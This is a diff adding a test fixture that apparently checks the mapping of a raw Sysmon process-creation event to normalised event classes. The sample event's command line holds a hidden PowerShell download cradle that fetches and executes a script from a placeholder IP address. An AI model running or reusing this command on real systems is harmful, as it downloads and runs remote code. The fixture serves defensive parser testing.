@@ -1,0 +1,6 @@
+---
+raw_sample: '{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"ctdl-wks-07","message":"Process Create","event_data":{"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2026-10-15T09:39:46.558Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.50/a\")","CurrentDirectory":"C:\\Windows\\system32\\\\","User":"CITADEL\\BSMITH","LogonId":"0x9da263","IntegrityLevel":"System","Hashes":"SHA256=103B1945E31833692B9B7710CDE08277183E99827C712FC60025E8D71359B594,MD5=0C8DFB28A33BB84CE50732A42BE8661D","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":"5000","ParentProcessId":"1000","ProcessGuid":"{1f47f4c6-c33d-74f5-793a-71dcfa7a63e6}","ParentProcessGuid":"{6e2c2d91-f949-24e8-456f-34bcb91d8bb4}","OriginalFileName":"powershell.exe"},"TimeCreated":"2026-10-15T09:39:52Z"}'
+expected:
+  activity_id: 1
+  category_uid: 1
+  class_uid: 1007
